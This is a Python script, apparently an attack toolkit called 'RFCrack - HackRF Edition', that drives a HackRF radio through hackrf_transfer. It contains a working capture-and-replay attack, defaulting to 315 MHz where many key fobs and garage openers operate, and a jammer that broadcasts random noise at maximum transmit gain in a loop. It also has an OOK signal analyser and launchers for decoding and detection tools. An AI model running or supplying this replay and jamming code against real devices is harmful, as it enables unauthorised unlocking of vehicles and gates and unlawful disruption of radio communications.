#!/usr/bin/env python3
import argparse
import sys
import subprocess
import time
import os
import signal
import numpy as np
from scipy.signal import butter, lfilter

# Check for matplotlib availability for plotting
try:
    import matplotlib.pyplot as plt
    PLOT_AVAILABLE = True
except ImportError:
    PLOT_AVAILABLE = False

def print_banner():
    print(r'''
    RFCrack - HackRF Edition
    ========================
''')

def run_command(command):
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return process
    except Exception as e:
        print(f"Error running command: {e}")
        return None

def signal_handler(sig, frame):
    print('\nExiting...')
    # sys.exit(0) # Let the caller handle exit if needed, or just exit.

signal.signal(signal.SIGINT, signal_handler)

def load_iq_data(filename):
    """Loads IQ data from a file (assuming 8-bit signed interleaved samples)."""
    try:
        data = np.fromfile(filename, dtype=np.int8)
        # Convert interleaved I/Q to complex samples
        # HackRF 8-bit signed is -128 to 127.
        # Create complex array directly from interleaved data
        iq_data = data.astype(np.float32).view(np.complex64)
        # Normalize (divide by 128.0)
        return iq_data / 128.0
    except Exception as e:
        print(f"[-] Error loading IQ data: {e}")
        return None

def butter_lowpass(cutoff, fs, order=5):
    """Creates a Butterworth low-pass filter."""
    nyquist = 0.5 * fs
    normal_cutoff = cutoff / nyquist
    b, a = butter(order, normal_cutoff, btype='low', analog=False)
    return b, a

def lowpass_filter(data, cutoff, fs, order=5):
    """Applies a Butterworth low-pass filter to the data."""
    b, a = butter_lowpass(cutoff, fs, order=order)
    y = lfilter(b, a, data)
    return y

def analyze_signal(filename, sample_rate, bit_rate=2000):
    """
    Performs basic OOK demodulation and analysis on a capture file.
    """
    print(f"[*] Analyzing {filename}...")
    iq_data = load_iq_data(filename)
    
    if iq_data is None:
        return

    # 1. Magnitude (Envelope Detection)
    envelope = np.abs(iq_data)

    # 2. Low-pass filter (Smoothing)
    # Cutoff at 2x bit rate is a reasonable starting point for visualization
    cutoff_freq = bit_rate * 2 
    filtered_envelope = lowpass_filter(envelope, cutoff_freq, sample_rate)

    # 3. Simple Thresholding (OOK Demodulation)
    threshold = np.mean(filtered_envelope) # Adaptive-ish threshold based on mean
    binary_signal = (filtered_envelope > threshold).astype(int)

    # 4. Extract bits (Naive approach: Downsampling)
    samples_per_bit = int(sample_rate / bit_rate)
    demodulated_bits = binary_signal[::samples_per_bit]
    
    # Identify basic repeating patterns (hex) - very rough
    # Convert binary array to string
    bit_str = "".join(map(str, demodulated_bits))
    
    print("\n--- Analysis Results ---")
    print(f"Analysis Bit Rate: {bit_rate} bps")
    print(f"Threshold Used: {threshold:.4f}")
    print(f"Total Samples: {len(iq_data)}")
    print(f"Recovered Bits (First 128): {bit_str[:128]}...")

    # Hex representation of the first few bytes
    try:
        # Pad to multiple of 8
        padded_bits = bit_str[:len(bit_str)//8 * 8]
        if padded_bits:
            hex_str = hex(int(padded_bits, 2))
            print(f"Hex Dump (Start): {hex_str[:66]}...")
    except ValueError:
        pass

    if PLOT_AVAILABLE:
        print("[*] Generating signal plot...")
        plt.figure(figsize=(12, 6))
        
        # Plot a segment of the signal (e.g., first 0.05 seconds or 10k samples)
        plot_samples = min(20000, len(envelope))
        t = np.arange(plot_samples) / sample_rate

        plt.subplot(3, 1, 1)
        plt.plot(t, envelope[:plot_samples], label='Raw Envelope')
        plt.title('Raw Signal Envelope')
        plt.grid(True)
        
        plt.subplot(3, 1, 2)
        plt.plot(t, filtered_envelope[:plot_samples], label='Filtered', color='orange')
        plt.axhline(threshold, color='red', linestyle='--', label='Threshold')
        plt.title('Filtered Envelope')
        plt.grid(True)
        
        plt.subplot(3, 1, 3)
        plt.step(t, binary_signal[:plot_samples], label='Demodulated', color='green')
        plt.title('Demodulated Digital Signal (OOK)')
        plt.xlabel('Time (s)')
        plt.grid(True)
        
        plt.tight_layout()
        output_img = filename + "_analysis.png"
        plt.savefig(output_img)
        print(f"[*] Plot saved to {output_img}")
    else:
        print("[-] Matplotlib not found. Skipping plot generation.")


def replay_attack(freq, sample_rate=2000000):
    capture_file = "capture.iq"
    
    print(f"[*] Starting Capture on {freq/1000000} MHz...")
    print("[*] Press Ctrl+C to stop capturing and start transmitting.")
    
    # Capture
    cmd = f"hackrf_transfer -r {capture_file} -f {freq} -s {sample_rate} -a 1 -l 16 -g 20"
    try:
        # Use shell=False for list arguments, or shell=True for string. 
        # Using string here for simplicity with Popen default
        p = subprocess.Popen(cmd, shell=True, stdout=sys.stdout, stderr=sys.stderr)
        p.wait()
    except KeyboardInterrupt:
        print("\n[*] Stopping capture...")
        p.terminate()
        p.wait()
    
    if not os.path.exists(capture_file):
        print("[-] No capture file generated.")
        return

    print(f"[*] Capture saved to {capture_file}")
    
    while True:
        try:
            choice = input(f"[*] Ready to Replay on {freq/1000000} MHz? [y/N/q/a]: ").lower()
        except EOFError:
            break
            
        if choice == 'y':
            print("[*] Transmitting...")
            # Transmit
            cmd = f"hackrf_transfer -t {capture_file} -f {freq} -s {sample_rate} -a 1 -x 47"
            try:
                p = subprocess.Popen(cmd, shell=True, stdout=sys.stdout, stderr=sys.stderr)
                p.wait()
            except KeyboardInterrupt:
                p.terminate()
                p.wait()
                print("\n[*] Transmission stopped.")
            print("[*] Transmission complete.")
        elif choice == 'a':
             # Analyze option
             bit_rate_in = input("[?] Enter estimated Bit Rate (default 2000): ")
             br = int(bit_rate_in) if bit_rate_in.isdigit() else 2000
             analyze_signal(capture_file, sample_rate, br)
        elif choice == 'q':
            break

def jammer(freq, sample_rate=2000000):
    print(f"[*] Starting Jammer on {freq/1000000} MHz...")
    # Generate a random noise file if it doesn't exist
    noise_file = "noise.iq"
    if not os.path.exists(noise_file):
        print("[*] Generating noise file...")
        with open(noise_file, "wb") as f:
            f.write(os.urandom(sample_rate * 2)) # 1 second of noise
            
    cmd = f"hackrf_transfer -t {noise_file} -f {freq} -s {sample_rate} -a 1 -x 47 -R" # -R for repeat
    try:
        p = subprocess.Popen(cmd, shell=True, stdout=sys.stdout, stderr=sys.stderr)
        p.wait()
    except KeyboardInterrupt:
        p.terminate()
        print("\n[*] Jamming stopped.")

def run_rtl433(freq, sample_rate):
    """
    Runs rtl_433 with HackRF support.
    """
    print(f"[*] Launching rtl_433 on {freq/1000000} MHz...")
    
    # Try using SoapySDR/HackRF driver support in rtl_433
    # Command: rtl_433 -d driver=hackrf -f <freq> -s <sample_rate>
    # Note: rtl_433 default sample rate is 250k, HackRF usually likes 2M+ but supports lower.
    # We'll use the user provided sample rate, but rtl_433 might act up if it's too high/low.
    # Typically 2M is fine for HackRF.
    
    cmd = [
        "rtl_433",
        "-d", "driver=hackrf",
        "-f", str(freq),
        "-s", str(sample_rate)
    ]
    
    try:
        subprocess.run(cmd)
    except FileNotFoundError:
        print("[-] Error: rtl_433 not found. Please install it (apt install rtl-433).")
    except KeyboardInterrupt:
        print("\n[*] Stopping rtl_433...")

def launch_salamandra():
    script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "extra_tools/SalamandraHackRF.py")
    subprocess.run([sys.executable, script_path, "-m"])

def launch_drone():
    script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "extra_tools/DroneDetectHackRF.py")
    subprocess.run([sys.executable, script_path])

def main():
    print_banner()
    
    parser = argparse.ArgumentParser(description="HackRF port of RFCrack functionality")

    parser.add_argument("-i", "--instant_replay", action='store_true', help="Record and Replay Signal")
    parser.add_argument("-j", "--jammer", action='store_true', help="Jam a frequency")
    parser.add_argument("-a", "--analyze", type=str, metavar="FILE", help="Analyze an existing capture file (OOK Demod)")
    parser.add_argument("-F", "--frequency", type=int, default=315000000, help="Frequency in Hz (default: 315000000)")
    parser.add_argument("-S", "--sample_rate", type=int, default=2000000, help="Sample Rate (default: 2M)")
    parser.add_argument("-B", "--baud_rate", type=int, default=2000, help="Baud/Bit Rate for analysis (default: 2000)")
    parser.add_argument("--salamandra", action='store_true', help="Launch Salamandra Spy Bug Detector")
    parser.add_argument("--drone", action='store_true', help="Launch Drone Detector")
    parser.add_argument("--rtl433", action='store_true', help="Launch rtl_433 (Signal Decoder)")
    parser.add_argument("--webui", action='store_true', help="Launch Web UI Interface")

    # Ignored/Unsupported args
    parser.add_argument("-r", "--rolling_code", action='store_true', help="[NOT SUPPORTED] Rolling Code")
    parser.add_argument("-M", "--modulation_type", help="[NOT SUPPORTED] Modulation Type")

    args = parser.parse_args()

    if args.salamandra:
        launch_salamandra()
        sys.exit(0)

    if args.drone:
        launch_drone()
        sys.exit(0)

    if args.rtl433:
        run_rtl433(args.frequency, args.sample_rate)
        sys.exit(0)

    if args.rolling_code:
        print("[-] Rolling Code attacks require signal demodulation which is not supported in this raw HackRF wrapper.")
        print("[-] This tool operates at the Physical Layer (Raw IQ).")
        sys.exit(1)

    if args.instant_replay:
        replay_attack(args.frequency, args.sample_rate)
    elif args.jammer:
        jammer(args.frequency, args.sample_rate)
    elif args.analyze:
        analyze_signal(args.analyze, args.sample_rate, args.baud_rate)
    elif args.webui:
        # We will implement this next
        print("[*] Starting Web UI...")
        try:
            import web_ui
            web_ui.start_server()
        except ImportError:
            print("[-] Error: web_ui.py not found or dependencies missing.")
    else:
        parser.print_help()

if __name__ == "__main__":
    main()